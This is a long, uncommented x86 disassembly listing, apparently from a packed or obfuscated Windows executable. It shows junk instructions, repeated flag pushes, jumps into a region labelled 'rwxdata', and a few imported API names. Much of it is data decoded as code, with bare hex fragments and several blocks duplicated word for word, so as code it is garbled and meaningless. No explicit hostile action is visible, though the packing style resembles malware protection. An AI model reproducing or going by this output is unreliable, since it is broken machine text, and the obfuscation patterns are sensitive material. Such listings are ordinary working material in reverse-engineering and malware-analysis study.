enter 0x9f0f 0xc3
pushad
ror bl cl
mov [ esp + 0x8 ] 0x24
ror al 0x6
pushfd
push 0x3db5ced4
stosb [ edi ]
mov bl ch
mov bl 0x2
lea esp [ esp + 0x4c ]
pushad
pushfd
lea esp [ esp + 0x24 ]
call sub_514aff
pushfd
push [ esp ]
lea esp [ esp + 0x8 ]
jae rwxdata
pop ds
dec esi
adc [ eax ] eax
mov eax [ 0x6b000ba6 ]
mov [ 0xfffffffffed3000b ] eax
or al 0x0
xlat
mov [ 0x11ee000b ] eax
or eax 0x11662600
add bh al
pop ecx
adc [ eax ] eax
adc al 0x5a
adc [ eax ] eax
lds esp [ eax + 0x11 ]
add [ ebx - 0x2affeeac ] bh
pushad
adc [ eax ] eax
dec esi
ror [ eax + eax ] 0x1
push cs
stosb [ edi ]
or eax [ eax ]
cmp [ ebx + 0x75f2000b ] ebp
adc [ eax ] eax
add al 0x7d
adc [ eax ] eax
aas
mov [ 0x7759000b ] al
adc [ eax ] eax
mov eax 0x85000ba6
into
add [ esp ] cl
adc [ eax ] eax
jg rwxdata
jbe rwxdata
jb rwxdata
mov bl 0x4a
setb bl
mov bl al
inc ecx
push esi
dec bl
pushfd
inc ecx
add esp 0x8
not bl
test dh 0x55
xchg ebp eax
daa
clc
mov eax ebp
pushad
add bl ah
mov bl 0x1
sub esp 0xffffffe0
mov al ch
mov al cl
lodsb [ esi ]
not bl
cmc
not al
jmp rwxdata
pushfd
pushfd
stc
sub ecx ecx
jmp rwxdata
add [ ecx + 0x11 ] ebx
add [ edx ] ch
dec [ eax + eax ]
add [ eax + 0x29001153 ] ah
push esp
adc [ eax ] eax
pop edx
test eax 0x5933000b
adc [ eax ] eax
js WaitForSingleObject@IAT
add [ ebp - 0x28fff332 ] al
adc [ eax ] eax
lodsd [ esi ]
movsd [ edi ] [ esi ]
or eax [ eax ]
je CreateEventA@IAT
je __import_name_6(MSVCRT:__getmainargs)
mov ecx 0x9d8736ba
push esp
add [ eax ] dl
inc ebx
ror al 0x2
call sub_515d7b
add [ eax ] al
pop edi
imul ebp [ edi + 0x62 ] 0x7ae96000
lea esp [ esp + 0x8 ]
or al 0x0
xlat
or eax [ eax ]
hlt
cmp [ esi + 0x11 ] edx
add cl al
adc [ 0x115c3e00 ] ecx
add [ edx - 0x2f ] al
or al 0x0
aaa
test al 0xb
add [ edx + 0x5a ] dh
adc [ eax ] eax
cmp dh [ ecx + 0x11 ]
add [ eax ] al
add [ eax ] al
add ch cl
arpl [ ecx ] dx
add [ eax + 0x76001177 ] ch
dec esp
adc [ eax ] eax
pop ecx
adc [ eax ] eax
mov [ esi + 0x11 ] gs
add [ ebx + ecx * 2 ] al
adc [ eax ] eax
jg rwxdata
xor ebx [ ecx + 0x11 ]
add [ ecx ] al
pop ecx
adc [ eax ] eax
sub bh bh
or al 0x0
adc [ eax ] eax
pushad
lea esp [ esp + 0x20 ]
jae rwxdata
pushad
lea esp [ esp + 0x20 ]
call sub_516816
push 0x2f36ccdf
push ebx
sub ecx ebx
push [ esp ]
call sub_514f1a
add [ eax ] al
push esi
imul esi [ edx + 0x74 ] 0x466c6175
jb rwxdata
call sub_4ba562
pushfd
call sub_514bca
add [ eax ] al
push edx
jo rwxdata
add [ eax ] al
add al al
add [ edx + esi * 8 + 0x14 ] esp
pop ecx
aas
or al 0x0
add [ eax ] al
inc eax
scasb [ edi ]
mov cl dh
loopne rwxdata
inc ebp
js rwxdata
add al 0xae
jb rwxdata
sub al 0x4
add [ eax ] al
loopne rwxdata
pop ecx
aas
or al 0x0
add [ eax ] al
add dh al
or esi ebx
adc [ fs : edx + 0x3f ] 0x58
add [ eax ] eax
add [ eax + 0xc ] dl
mov edi edx
sub al 0x26
pop ecx
aas
or al 0x0
add [ eax ] al
add [ edi + 0x2264fcdc ] ah
pop ecx
aas
clc
push eax
push [ esp + 0x4 ]
xchg [ esp + 0x8 ] ebp
sub bp dx
shl ebp cl
lea ebp [ esp + 0x8 ]
stc
push [ esp ]
bt esi 0x2
cmp esp ecx
mov [ esp + 0x8 ] ecx
mov [ esp + 0x4 ] 0x6b
mov [ esp + 0x4 ] ebx
cmc
bt dx 0x1
or eax eax
call sub_4d126d
lodsb [ esi ]
pushfd
not al
clc
jmp rwxdata
lea eax [ 0x0 ]
mov [ esp ] 0x35
mov [ esp + 0x3c ] rwxdata
jmp rwxdata
pop [ esp + 0x1c ]
pushad
push [ esp ]
jmp rwxdata
clc
inc ebp
jbe rwxdata
inc ebx
aas
out 0x0 eax
add [ eax ] al
jmp rwxdata
salc
clc
hlt
cmc
mov [ esp ] 0x4a54
ror al 0x2
mov [ esp + 0x4 ] bh
dec al
jmp rwxdata
push 0x21193420
call sub_4ba009
add [ eax ] al
inc ebx
jb rwxdata
xchg [ eax - 0x64 ] bl
and [ esi - 0x39 ] ah
inc esp
and al 0x4
scasb [ edi ]
outsb
je rwxdata
jbe rwxdata
cmc
cmc
stc
ror al 0x6
lea esp [ esp + 0x2c ]
jne rwxdata
sub [ ebp - 0x282051e4 ] bh
in al dx
xchg edx eax
add [ ebx - 0x5afb46d0 ] ch
jo rwxdata
cdq
xlat
movsb [ edi ] [ esi ]
neg [ ecx - 0x279cc9c7 ]
add [ eax ] al
ja rwxdata
add al ch
out dx al
mov dl 0xfb
jmp [ esi - 0x39 ]
add [ eax ] cl
xor eax 0x7d9bf9ac
lodsd [ esi ]
shl al 0x7c
in al dx
je rwxdata
pop esi
aas
or [ esp + eax ] 0x7
dec ebx
out 0xf2 eax
mov bl 0xf3
inc ebx
aas
cmp eax 0x90000008
pop ss
sub al 0xf1
loopne rwxdata
call sub_4cfe42
mov [ esp ] 0x4e50
add dl dl
lea esp [ esp + 0x4 ]
js rwxdata
call j_sub_51680a
pushfd
mov [ esp ] 0xc4ad
cmp eax 0x7d00
pushfd
pushad
lea esp [ esp + 0x28 ]
jae rwxdata
je rwxdata
outsb
inc esp
arpl [ gs : edx + 0x79 ] si
jo rwxdata
je rwxdata
jae rwxdata
mov es sp
pop ss
add eax 0x830ad99d
xchg edi eax
cwde
mov al 0x26
pop ecx
aas
or al 0x0
add [ eax ] al
inc eax
inc ecx
idiv ch
leave
inc ebx
aas
jmp rwxdata
pushfd
push [ esp ]
push 0x42e22958
lea esp [ esp + 0xc ]
jne rwxdata
stc
pushfd
call sub_4cd0f5
int1
xor ah [ eax - 0x51a37b79 ]
add al 0xa5
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
je rwxdata
popad
jo rwxdata
je rwxdata
xor al 0xfd
movsd [ edi ] [ esi ]
dec esi
push edi
div [ 0x69d36210 ]
fsubr [ ebp - 0x5809edc ]
mov ecx 0xa2c3bbf9
enter 0x5d3f 0x2f
test edx 0xeb93f012
mov ch 0x27
push 0xffffffda
add [ eax ] al
imul esi [ ebx + 0x73 ] 0x65636170
add [ 0x7f ] bh
push ecx
pushfd
call sub_4d11bc
add [ eax ] al
pop edi
popad
insb
insb
imul esi [ fs : esi ] 0x52c3980f
mov bl 0x2
push 0xe370dce6
push eax
jmp rwxdata
mov [ 0xfffffffff274f6d5 ] al
sub bh [ cs : edi ]
jle rwxdata
add [ eax ] al
add ah ah
inc ebp
xor al [ fs : ebx + 0x3f ]
add [ edx ] al
add [ eax ] al
loopne rwxdata
pushfd
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
pushfd
push [ esp + 0x4 ]
retn 0x8
jmp rwxdata
inc ebx
push edx
push esp
insb
imul ebp [ esi + 0x64 ] 0x4473776f
imul esi [ edx + 0x65 ] 0x726f7463
jns rwxdata
mov ah 0x5a
0xaf298232 0x972a
into
sub ebx esi
0xa7d209b5 0x53f4
jb rwxdata
add [ eax ] al
add [ edi + 0x65 ] al
pop edi
je rwxdata
out 0x42 al
in eax 0x54
test [ ebx ] eax
js rwxdata
add [ eax ] al
add [ ebx + 0x70 ] dh
jb rwxdata
inc ecx
push [ esp + 0x8 ]
pushfd
mov al 0x10
pushfd
jmp rwxdata
inc edx
sahf
imul [ ebp + 0x1d88a34f ]
nop
jo rwxdata
push cs
je rwxdata
or [ eax ] al
add [ eax ] al
in al 0x45
mov edi ebx
nop
stc
inc ebx
aas
test [ ebx ] 0x0
add [ eax + 0x38f2d8fc ] ah
pop ecx
aas
or al 0x0
add [ eax ] al
add dl ch
pop esi
stc
enter 0x5926 0x3f
or al 0x0
add [ eax ] al
inc eax
lds edi [ edx - 0x7 ]
cmp [ ebx + 0x3c3f52 ] al
add [ eax ] al
xor [ edx - 0x6 ] dl
cld
les eax [ ebx + 0x1483f52 ]
add [ eax ] al
pushad
pushf
pop [ esp + 0x1e ]
pushfd
not dl
rcl dl cl
mov dl [ esi ]
jmp rwxdata
call sub_5160c0
fdivr [ eax - 0x29 ]
pop ebp
0x2c6efc40 0xba31
lodsd [ esi ]
add eax 0x56534d00
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
mov esp 0x830d700a
and cl ch
jmp rwxdata
imul ebp [ edi + 0x6e ] r-xdata
add [ eax ] al
jo rwxdata
scasd [ edi ]
sub dl [ edi - 0x150cd632 ]
mov ch 0x9
shl [ edi + 0x482053f4 ] cl
xor eax 0xc663e665
jpo rwxdata
inc ebx
add [ ebp + 0x5 ] cl
add dh al
add al 0x24
xor eax 0x3c2444c7
xor ch [ eax + 0x51 ]
add cl ch
inc edi
pop esp
cli
dec [ ebx - 0x14 ]
inc edi
0x859c
add [ eax ] al
jo rwxdata
jae rwxdata
test ecx ecx
rcl [ 0x2b41ffdc ] cl
cmp eax 0xf8ddff8a
mov ebp 0x64e42207
0xd9ba
hlt
outsb
je rwxdata
mov [ esp + 0x4 ] ch
pushad
pop ecx
aas
or al 0x0
add [ eax ] al
shr dl 0x34
clc
pushfd
cli
push ebp
lahf
adc ecx ebx
into
pop edx
test [ edi + 0x4086c7ea ] eax
js rwxdata
not dl
mov [ esp ] 0x7
ror dl 0x2
pushfd
push 0xe79e7e8c
dec dl
bt sp bx
clc
push [ esp + 0x8 ]
ror dl 0x6
std
bt ax bx
cmc
push [ esp + 0x2e ]
popf
pushfd
mov [ esp ] 0x3f
inc esi
jmp rwxdata
insb
add [ eax ] al
add [ ebx + 0x65 ] dl
je rwxdata
insb
jbe rwxdata
je rwxdata
jpe rwxdata
je rwxdata
add [ ecx ] edi
add [ esi + 0x70 ] ah
jne rwxdata
add cl dl
push edi
shr [ eax - 0x31 ] 0x40
jb rwxdata
push [ ebp - 0x8 ]
add [ eax - 0x77 ] ah
inc esp
and al 0x20
mov [ esp + 0x4 ] 0x86ae
pop eax
pushfd
outsb
inc esp
jae rwxdata
jb rwxdata
sub bh [ edi ]
rol [ ecx ] 0x15
adc dl dl
mov [ esp ] bl
pushfd
push esp
pushfd
push [ esp + 0x40 ]
retn 0x44
jae rwxdata
arpl [ ebp + 0x43 ] sp
popad
jo rwxdata
call sub_514aff
jmp rwxdata
add al 0x51
add [ edi + 0x18 ] eax
imul esi [ 0x24648db4 ] 0x8
inc ecx
xor [ ebx - 0x50c87ee4 ] eax
sub ch cl
mov esp 0xbcaf27cd
or cl al
cdq
popfd
sbb ch bl
xchg edi eax
je rwxdata
arpl [ eax ] ax
add [ eax ] al
inc edi
je rwxdata
0xda80
je rwxdata
outsd
pushfd
adc [ edx ] esi
xchg esi eax
imul edx ecx 0xa7c254e0
in al 0xcf
je rwxdata
xchg ecx eax
add [ ecx + ebp - 0x1 ] edi
add [ eax ] al
add [ esi + 0x66 ] ah
insb
jne rwxdata
setae [ 0xffffffffa81b6c87 ]
test [ ecx ] edi
fmul [ ecx - 0x7ed456cd ]
sahf
push ss
scasd [ edi ]
shr esp 0x1
or [ ecx + 0x3a ] esp
jo rwxdata
scasb [ edi ]
add [ ebp + 0x7c019132 ] bl
sub edi edi
push esi
add al ch
or [ ebp + 0x534d0005 ] ebp
mov al [ 0xffffffffae5c8487 ]
dec ebp
aam 0x91
hlt
aad 0x4d
lea esp [ esp + 0x38 ]
call sub_514aff
pushad
adc al al
call sub_4ba21b
add [ eax ] al
dec edi
jo rwxdata
push 0x246c8800
add al 0x60
push eax
sbb cl [ esi - 0x29 ]
sahf
cwde
shr [ ebp + 0x32 ] 0x2c
imul edx [ esi - 0x80 ] 0xffffffd7
or [ ebx ] eax
jne rwxdata
dec esp
cmp ecx [ edx + 0x20 ]
imul eax [ ecx + edx * 2 ] 0x1
inc edi
sbb [ ebx + 0x35 ] ch
mov ah 0x8d
and al 0x8
sub_4baa7e
lea esp [ esp + 0x28 ]
jns rwxdata
call sub_4ba55b
jne rwxdata
jmp rwxdata
push 0x8b47106a
lea esp [ esp + 0x4 ]
jmp rwxdata
mov bx [ esi ]
bt dx ax
bt si 0x9
bt bp 0x3
pushad
shr ebx 0xc
stc
cmp ebx 0x1
call sub_515994
add [ eax ] al
inc edi
je rwxdata
pushad
test ebx ebx
stc
cmp [ esi ] 0x0
mov [ esp + 0x10 ] 0xa5145729
jmp rwxdata
call sub_5191a9
fcmove st5
pop eax
imul esi [ ebx + 0x6b ] 0x65657246
push ebx
jo rwxdata
lea esp [ esp + 0x20 ]
je rwxdata
add [ eax - 0x58 ] ch
adc al al
jle __import_name_0(KERNEL32:GetCurrentProcess)
jle rwxdata
mov esp 0x4601781d
cmp al 0x69
mov [ 0xffffffffe9ef6996 ] ch
lodsb [ si ]
cmpsd [ esi ] [ edi ]
arpl [ ebp + 0x45 ] sp
js rwxdata
not bl
not cx
push esi
pushfd
mov ebx [ esp + 0x8 ]
mov [ esp + 0x4 ] bh
setns cl
mov ecx [ esp + 0xc ]
pushfd
call j_sub_4cfe36
seto bl
and ecx ecx
shr di cl
mov ecx [ esi + 0x4 ]
setne bh
test ch ch
rol bh cl
sub ecx 0x8
xadd di bx
movzx di bl
shr ecx 0x1
clc
bswap bx
jmp rwxdata
inc edi
je rwxdata
in al dx
outsd
bswap esi
lahf
cmp al 0x0
add dl bl
int 0x58
mov edi 0x6bd472f
in al 0x62
mov dl 0x70
sti
insb
imul [ edx + 0x7c5df96f ]
mov al 0x27
mov ecx 0x319e2d58
mov eax [ 0xffffffffbc36a200 ]
sbb eax 0x3c460178
imul ecx [ eax - 0x109669d3 ] 0xa7ac67e9
push 0x9447f669
mov ebp 0xd6af0e06
pushfd
cmp [ edi ] eax
add [ ebp - 0x185c2d04 ] ecx
cmpsb [ es : esi ] [ edi ]
sar [ ebp - 0x536ddcb0 ] cl
je rwxdata
add [ ebx - 0x54f099c2 ] cl

jmp rwxdata
xchg esi eax
imul ebp edi 0xa7ac67e9
jne rwxdata
mov edi [ esi ]
bts bx cx
dec bl
bsr bx cx
add edi [ ebp - 0x4 ]
bsr bx ax
add esi 0x8
cli
stc
dec edi
loopne rwxdata
jb rwxdata
push cs
scasd [ edi ]
salc
sbb dl bh
sub al 0xd3
xchg esp eax
movsd [ edi ] [ esi ]
adc bl [ edi - 0x12 ]
pushfd
mov ebx 0x66909afa
xchg ecx eax
test al 0x38
xchg esi eax
cld
cdq
fsubr st5
outsd
dec eax
mov [ 0xffffffffd2a626e7 ] eax
mov ebp 0xac922350
outsb
je rwxdata
cmp [ edx + 0x26 ] dh
mov edi 0x68ab77ca
cli
jb rwxdata
jb rwxdata
salc
arpl [ ebp + 0x73 ] sp
jae rwxdata
push 0x7ec010a8
sub_4bab1c
lea esp [ esp + 0x2c ]
jne rwxdata
jmp rwxdata
push esi
mov [ esp ] cl
mov [ esp ] edi
mov [ esp ] dh
lea esp [ esp + 0x4 ]
jmp rwxdata
mov bx [ esi ]
bt dx ax
bt si 0x9
bt bp 0x3
pushad
shr ebx 0xc
stc
cmp ebx 0x1
call sub_515994
add [ eax ] al
inc edi
je rwxdata
pushad
test ebx ebx
stc
cmp [ esi ] 0x0
mov [ esp + 0x10 ] 0xa5145729
jmp rwxdata
call sub_5191a9
fcmove st5
pop eax
imul esi [ ebx + 0x6b ] 0x65657246
push ebx
jo rwxdata
lea esp [ esp + 0x20 ]
je rwxdata
add [ eax - 0x58 ] ch
adc al al
jle __import_name_0(KERNEL32:GetCurrentProcess)
jle rwxdata
mov esp 0x4601781d
cmp al 0x69
mov [ 0xffffffffe9ef6996 ] ch
lodsb [ si ]
cmpsd [ esi ] [ edi ]
arpl [ ebp + 0x45 ] sp
js rwxdata
not bl
not cx
push esi
pushfd
mov ebx [ esp + 0x8 ]
mov [ esp + 0x4 ] bh
setns cl
mov ecx [ esp + 0xc ]
pushfd
call j_sub_4cfe36
seto bl
and ecx ecx
shr di cl
mov ecx [ esi + 0x4 ]
setne bh
test ch ch
rol bh cl
sub ecx 0x8
xadd di bx
movzx di bl
shr ecx 0x1
clc
bswap bx
jmp rwxdata
inc edi
je rwxdata
in al dx
outsd
bswap esi
lahf
cmp al 0x0
add dl bl
int 0x58
mov edi 0x6bd472f
in al 0x62
mov dl 0x70
sti
insb
imul [ edx + 0x7c5df96f ]
mov al 0x27
mov ecx 0x319e2d58
mov eax [ 0xffffffffbc36a200 ]
sbb eax 0x3c460178
imul ecx [ eax - 0x109669d3 ] 0xa7ac67e9
push 0x9447f669
mov ebp 0xd6af0e06
pushfd
cmp [ edi ] eax
add [ ebp - 0x185c2d04 ] ecx
cmpsb [ es : esi ] [ edi ]
sar [ ebp - 0x536ddcb0 ] cl
je rwxdata
add [ ebx - 0x54f099c2 ] cl

jmp rwxdata
xchg esi eax
imul ebp edi 0xa7ac67e9
jne rwxdata
mov edi [ esi ]
bts bx cx
dec bl
bsr bx cx
add edi [ ebp - 0x4 ]
bsr bx ax
add esi 0x8
cli
stc
dec edi
loopne rwxdata
jb rwxdata
push cs
scasd [ edi ]
salc
sbb dl bh
sub al 0xd3
xchg esp eax
movsd [ edi ] [ esi ]
adc bl [ edi - 0x12 ]
pushfd
mov ebx 0x66909afa
xchg ecx eax
test al 0x38
xchg esi eax
cld
cdq
fsubr st5
outsd
dec eax
mov [ 0xffffffffd2a626e7 ] eax
mov ebp 0xac922350
outsb
je rwxdata
cmp [ edx + 0x26 ] dh
mov edi 0x68ab77ca
cli
jb rwxdata
jb rwxdata
salc
arpl [ ebp + 0x73 ] sp
jae rwxdata
push 0x7ec010a8
sub_4c808e
inc edx
push ds
mov edi cs
in eax dx
fsub [ ecx + esi * 2 - 0x4e ]
inc esp
lodsd [ esi ]
push edi
sub [ ebx + ebx * 2 - 0x44 ] ch
mov cl 0x67
insb
in al 0x39
mov al 0x98
jns rwxdata
inc edx
and bl [ eax - 0x2b93ce2a ]
lds esi [ eax + 0x6913bc8 ]
xchg edx eax
pushfd
lodsd [ esi ]
push esp
cmp [ ecx + 0x4c ] ch
mov dl 0xab
mov al 0xe
rcl [ ecx + ecx * 4 + 0x41 ] cl
shl [ edx + 0x30d61cf6 ] 0x1
jbe rwxdata
iretd
mov ebx 0x32b61069
mov eax 0xf6e887ac
pop esp
mov cl 0x97
stosd [ edi ]
enter 0x8714 0x38
mov bh 0x61
add [ ecx + 0x357cf2ae ] dh
cwde
in al dx
pop ss
pop ebx
mov [ esi ] dh
nop
in eax 0x77
mov dl 0xe8
xor [ eax - 0x3fa4a008 ] edi
mov ch 0x67
movsb [ edi ] [ esi ]
mov esi 0x2dcf0c1e
dec esp
inc edx
mov cl 0xf2
pushad
stc
0xdccf3b78 0x6ed5
or [ edx + 0x22 ] al
cwde
salc
xor [ esp + edx * 8 - 0x3b ] ebp
mov al 0xc8
cmp edx [ ecx - 0x52636dfa ]
sub_4cce3d
push [ esp ]
test cl bh
test eax eax
call sub_51642b
add [ eax ] al
push ebx
insb
arpl [ gs : eax + edx * 2 + 0x61 ] si
insb
je rwxdata
mov al 0x23
mov al [ 0xffffffff9fcb8e31 ]
or eax 0x85129b7c
into
sbb ebx [ ebp + ebx + 0xd ]
jmp 0xffffffffb0a7b558
add [ gs : eax + 0x17 ] ch
adc eax eax
call sub_4c808e
add al 0x0
hlt
sub_4cce9f
not al
push 0xa0dafdf7
stc
pushad
ror al 0x2
call sub_515dbe
cmc
test dl bh
call sub_4ccec1
add [ eax ] al
jae rwxdata
xchg edx eax
push ds
dec edi
dec ebx
pop eax
jpe rwxdata
outsb
popad
insb
add al ch
jne rwxdata
cmp eax 0xe7b64b3e
dec eax
pop eax
or [ esi + 0x70 ] edx
out dx al
popad
sar [ edx - 0x32 ] 0x55
mov ebp 0x46f8d2a3
mov edx 0xd6beef09
cmpsd [ esi ] [ edi ]
shl [ edi + 0x452d7b36 ] 0xc3
mov dl 0xc6
jge rwxdata
salc
add al 0x0
add [ ecx - 0x4fde68ca ] ch
and esp [ eax - 0x603471cf ]
or eax 0x85129b7c
into
sbb ebx [ ebp + ebx + 0xd ]
jmp 0xffffffffb0a7b558
imul [ ebx + 0x225302ba ]
clc
call 0xffffffffdad0244e
push esi
xlat
mov ds [ edi - 0x5dc34dc1 ]
sbb edi [ ebp - 0x1118915 ]
pop eax
out dx eax
mov esi 0xb7c0a7d6
jpo rwxdata
jg rwxdata
je rwxdata
inc ebp
retn
retn 0xc75f
daa
and [ 0xfffffffff89f7497 ] ecx
push ds
sbb edi [ esi + 0x2 ]
mov eax 0xbdeb9c31
sub al [ ecx + 0x71d55019 ]
and eax 0x46f98735
dec ebx
mov dh 0xe7
mov bh 0xf
push ebx
dec ebx
mov dh 0xe7
sub_4cd011
pushfd
lea esp [ esp + 0x28 ]
je rwxdata
shr bh cl
shl bx cl
push eax
mov bx [ esi ]
pushad
mov [ esp ] 0xac
push esi
lea esp [ esp + 0x24 ]
jmp rwxdata
pushad
jmp rwxdata
cmp dh ah
bt ax ax
add esi 0x2
jmp rwxdata
pushfd
dec ecx
call sub_4baa7e
add [ eax ] al
pop edi
popad
jne rwxdata
sub bl [ edx ]
lea ecx [ ebx - 0x74fd2acb ]
rcr [ cs : ebx + 0x1a ] cl
pop eax
rwxdata
insb
jae rwxdata
arpl [ ebp + 0x70 ] bp
add [ eax ] al
add [ ebx + 0x74 ] dh
jb rwxdata
js rwxdata
jb rwxdata
and al 0x40
je rwxdata
lahf
retn
inc ebx
or cl [ ebx - 0x52 ]
call sub_5149a7
push 0x2ac01081
call sub_518563
jmp rwxdata
jmp rwxdata
and al 0x40
add [ eax - 0x2 ] ah
enter 0x9f0f 0xc3
pushad
ror bl cl
mov [ esp + 0x8 ] 0x24
ror al 0x6
pushfd
push 0x3db5ced4
stosb [ edi ]
mov bl ch
mov bl 0x2
lea esp [ esp + 0x4c ]
pushad
pushfd
lea esp [ esp + 0x24 ]
call sub_514aff
pushfd
push [ esp ]
lea esp [ esp + 0x8 ]
jae rwxdata
mov bl 0x4a
setb bl
mov bl al
inc ecx
push esi
dec bl
pushfd
inc ecx
add esp 0x8
not bl
test dh 0x55
xchg ebp eax
daa
clc
mov eax ebp
pushad
add bl ah
mov bl 0x1
sub esp 0xffffffe0
mov al ch
mov al cl
lodsb [ esi ]
not bl
cmc
not al
jmp rwxdata
pushfd
pushfd
stc
sub ecx ecx
jmp rwxdata
cmp di 0xba02
cmp si sp
push esi
ror si cl
pushad
mov esi edi
call sub_51578e
add [ eax ] al
dec esi
je rwxdata
push 0xf9efd1ed
mov [ esp ] bp
pushad
mov [ esp + 0x20 ] esi
shr esi cl
lea esi [ eax * 2 - 0x2888c866 ]
mov esi edi
push [ esp ]
call sub_515aa3
ror al 0x2
call sub_515d7b
add [ eax ] al
pop edi
imul ebp [ edi + 0x62 ] 0x7ae96000
lea esp [ esp + 0x8 ]
bt esp 0x10
clc
stc
clc
and ebx 0xfff
cmp ah 0x4e
pushfd
stc
clc
add [ edi + ebx ] edx
sub esp 0xfffffff8
mov ebx [ esi ]
imul ebp [ edi + 0x73 ] 0x5ce06100
cmc
fidiv [ ebp - 0x3914778 ]
pop esp
pushad
lea esp [ esp + 0x20 ]
jae rwxdata
inc ecx
and esi ebp
je rwxdata
and al 0x45
shl [ edi - 0x64 ] 0x3c
bound edi [ eax + edx * 4 + 0xe ]
out dx eax
xchg [ esi ] ch
lea ecx [ edx ]
mov eax [ 0xffffffffff43e6e3 ]
mov esp 0x4ece65cb
shl [ edx - 0xd ] cl
jb rwxdata
pushad
lea esp [ esp + 0x20 ]
call sub_516816
push 0x2f36ccdf
push ebx
sub ecx ebx
push [ esp ]
call sub_514f1a
add [ eax ] al
push esi
imul esi [ edx + 0x74 ] 0x466c6175
jb rwxdata
call sub_4ba562
pushfd
call sub_514bca
add [ eax ] al
push edx
jo rwxdata

test al 0xf7
scasb [ edi ]
retn 0xc088
add [ eax ] al
add al al
add [ edx + esi * 8 + 0x14 ] esp
pop ecx
aas
or al 0x0
add [ eax ] al
inc eax
scasb [ edi ]
mov cl dh
loopne rwxdata
inc ebp
js rwxdata
add al 0xae
jb rwxdata
sub al 0x4
add [ eax ] al
loopne rwxdata
pop ecx
aas
or al 0x0
add [ eax ] al
add dh al
or esi ebx
adc [ fs : edx + 0x3f ] 0x58
add [ eax ] eax
add [ eax + 0xc ] dl
mov edi edx
sub al 0x26
pop ecx
aas
or al 0x0
add [ eax ] al
add [ edi + 0x2264fcdc ] ah
pop ecx
aas
clc
push eax
push [ esp + 0x4 ]
xchg [ esp + 0x8 ] ebp
sub bp dx
shl ebp cl
lea ebp [ esp + 0x8 ]
stc
push [ esp ]
bt esi 0x2
cmp esp ecx
mov [ esp + 0x8 ] ecx
mov [ esp + 0x4 ] 0x6b
mov [ esp + 0x4 ] ebx
cmc
bt dx 0x1
or eax eax
call sub_4d126d
lodsb [ esi ]
pushfd
not al
clc
jmp rwxdata
lea eax [ 0x0 ]
mov [ esp ] 0x35
mov [ esp + 0x3c ] rwxdata
jmp rwxdata
pop [ esp + 0x1c ]
pushad
push [ esp ]
jmp rwxdata
clc
inc ebp
jbe rwxdata
inc ebx
aas
out 0x0 eax
add [ eax ] al
jmp rwxdata
salc
clc
hlt
cmc
mov [ esp ] 0x4a54
ror al 0x2
mov [ esp + 0x4 ] bh
dec al
jmp rwxdata
push 0x21193420
call sub_4ba009
add [ eax ] al
inc ebx
jb rwxdata
xchg [ eax - 0x64 ] bl
and [ esi - 0x39 ] ah
inc esp
and al 0x4
scasb [ edi ]
outsb
je rwxdata
jbe rwxdata
cmc
cmc
stc
ror al 0x6
lea esp [ esp + 0x2c ]
jne rwxdata
add [ ebx - 0x5afb46d0 ] ch
jo rwxdata
cdq
xlat
movsb [ edi ] [ esi ]
neg [ ecx - 0x279cc9c7 ]
add [ eax ] al
ja rwxdata
add al ch
out dx al
mov dl 0xfb
jmp [ esi - 0x39 ]
add [ eax ] cl
xor eax 0x7d9bf9ac
lodsd [ esi ]
shl al 0x7c
in al dx
je rwxdata
pop esi
aas
or [ esp + eax ] 0x7
dec ebx
out 0xf2 eax
mov bl 0xf3
inc ebx
aas
cmp eax 0x90000008
pop ss
sub al 0xf1
loopne rwxdata
call sub_4cfe42
mov [ esp ] 0x4e50
add dl dl
lea esp [ esp + 0x4 ]
js rwxdata
call j_sub_51680a
pushfd
mov [ esp ] 0xc4ad
cmp eax 0x7d00
pushfd
pushad
lea esp [ esp + 0x28 ]
jae rwxdata
jmp rwxdata
outsb
inc esp
arpl [ gs : edx + 0x79 ] si
jo rwxdata
je rwxdata
jae rwxdata
mov es sp
pop ss
add eax 0x830ad99d
xchg edi eax
cwde
mov al 0x26
pop ecx
aas
or al 0x0
add [ eax ] al
inc eax
inc ecx
idiv ch
leave
inc ebx
aas
jmp rwxdata
pushfd
push [ esp ]
push 0x42e22958
lea esp [ esp + 0xc ]
jne rwxdata
stc
pushfd
call sub_4cd0f5
sub [ ebp - 0x282051e4 ] bh
in al dx
xchg edx eax
stosd [ edi ]
xor [ ecx + 0x32f1a504 ] bh
int1
xor ah [ eax - 0x51a37b79 ]
add al 0xa5
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
je rwxdata
popad
jo rwxdata
je rwxdata
xor al 0xfd
movsd [ edi ] [ esi ]
dec esi
push edi
div [ 0x69d36210 ]
fsubr [ ebp - 0x5809edc ]
mov ecx 0xa2c3bbf9
enter 0x5d3f 0x2f
test edx 0xeb93f012
mov ch 0x27
push 0xffffffda
add [ eax ] al
imul esi [ ebx + 0x73 ] 0x65636170
add [ 0x7f ] bh
push ecx
pushfd
call sub_4d11bc
add [ eax ] al
pop edi
popad
insb
insb
imul esi [ fs : esi ] 0x52c3980f
mov bl 0x2
push 0xe370dce6
push eax
jmp rwxdata
mov [ 0xfffffffff274f6d5 ] al
sub bh [ cs : edi ]
jle rwxdata
add [ eax ] al
add ah ah
inc ebp
xor al [ fs : ebx + 0x3f ]
add [ edx ] al
add [ eax ] al
loopne rwxdata
pushfd
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
pushfd
push [ esp + 0x4 ]
retn 0x8
jmp rwxdata
inc ebx
push edx
push esp
insb
imul ebp [ esi + 0x64 ] 0x4473776f
imul esi [ edx + 0x65 ] 0x726f7463
jns rwxdata
mov ah 0x5a
0xaf298232 0x972a
into
sub ebx esi
0xa7d209b5 0x53f4
jb rwxdata
add [ eax ] al
add [ edi + 0x65 ] al
pop edi
je rwxdata
out 0x42 al
in eax 0x54
test [ ebx ] eax
js rwxdata
add [ eax ] al
add [ ebx + 0x70 ] dh
jb rwxdata
inc ecx
push [ esp + 0x8 ]
pushfd
mov al 0x10
pushfd
jmp rwxdata
inc edx
sahf
imul [ ebp + 0x1d88a34f ]
nop
jo rwxdata
push cs
je rwxdata
or [ eax ] al
add [ eax ] al
in al 0x45
mov edi ebx
nop
stc
inc ebx
aas
test [ ebx ] 0x0
add [ eax + 0x38f2d8fc ] ah
pop ecx
aas
or al 0x0
add [ eax ] al
add dl ch
pop esi
stc
enter 0x5926 0x3f
or al 0x0
add [ eax ] al
inc eax
lds edi [ edx - 0x7 ]
cmp [ ebx + 0x3c3f52 ] al
add [ eax ] al
xor [ edx - 0x6 ] dl
cld
les eax [ ebx + 0x1483f52 ]
